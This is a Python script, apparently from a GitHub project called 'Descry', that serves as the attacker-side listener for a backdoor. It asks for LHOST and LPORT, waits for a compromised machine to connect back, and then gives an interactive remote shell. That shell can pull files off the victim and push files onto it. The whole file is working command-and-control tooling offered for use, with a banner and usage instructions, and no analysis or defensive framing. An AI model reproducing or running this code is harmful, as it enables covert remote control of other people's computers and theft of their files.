import socket
import os
import json
#internet connection b/w two machine
from termcolor import colored

#banner
print(colored('''
▓█████▄ ▓█████   ██████  ▄████▄   ██▀███ ▓██   ██▓
▒██▀ ██▌▓█   ▀ ▒██    ▒ ▒██▀ ▀█  ▓██ ▒ ██▒▒██  ██▒
░██   █▌▒███   ░ ▓██▄   ▒▓█    ▄ ▓██ ░▄█ ▒ ▒██ ██░
░▓█▄   ▌▒▓█  ▄   ▒   ██▒▒▓▓▄ ▄██▒▒██▀▀█▄   ░ ▐██▓░
░▒████▓ ░▒████▒▒██████▒▒▒ ▓███▀ ░░██▓ ▒██▒ ░ ██▒▓░
 ▒▒▓  ▒ ░░ ▒░ ░▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░░ ▒▓ ░▒▓░  ██▒▒▒ 
 ░ ▒  ▒  ░ ░  ░░ ░▒  ░ ░  ░  ▒     ░▒ ░ ▒░▓██ ░▒░ 
 ░ ░  ░    ░   ░  ░  ░  ░          ░░   ░ ▒ ▒ ░░  
   ░       ░  ░      ░  ░ ░         ░     ░ ░
 ░                      ░                 ░ ░
''','grey'))

print(colored('                          v1.0(Beta)','yellow'))
print(colored('                          By HADES','red'))

print('''
!!!This script is the listner for the backdoor created by hades. 
You will find the link for github repo. here 
https://github.com/hades-onion/descry

Note: please wait for 20 seconds after execution of backdoor. 
	due to delay of 20 second


example : 
LHOST=192.168.54.2
LPORT=443
''')



#create an INET  ,streaming socket
sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

def reliable_send(data):
	jsondata = json.dumps(data)
	target.send(jsondata.encode())
def realible_recv():
	data = ''
	while True:
		try:
			data = data + target.recv(1024).decode().rstrip()
			return json.loads(data)
		except ValueError:
			continue
def upload_file(file_name):
        f = open(file_name, 'rb')
        target.send(f.read())


def download_file(file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()


def target_communication():
	while True:
		command = input('* shell~%s: ' % str(address))
		reliable_send(command)
		if command == 'help':
			print("Shell Commands: \n help - show this manual \n quit - exits the shell. \n download - downloads the file from target. \n            example: 'download file_name.txt' \n Upload - uploads file from this device to target. \n clear:- clear the screen.")
		elif command == 'clear':
			os.system('clear')
		elif command[:3] == 'cd ':
			pass
		elif command[:8] == 'download':
			download_file(command[9:])
		elif command[:6] == 'upload':
			upload_file(command[7:])
		elif command == 'quit':
			print(colored("[+]Backdoor Terminated",'cyan'))
			break
		else:
			result = realible_recv()
			print(result)

	# bind the socket to a public host
host=input(colored("[*] LHOST=",'blue'))
port=int(input(colored("[*] LPORT=",'blue')))
sock.bind((host,port))
	#become a server socket
print(colored('[+] listnening for incoming connections','green'))
sock.listen(5)
	# accept connections from outside
target,address = sock.accept()
print(colored("[+] Incoming connection from: " + str(address),'green'))
print("use help to see the options")
target_communication()

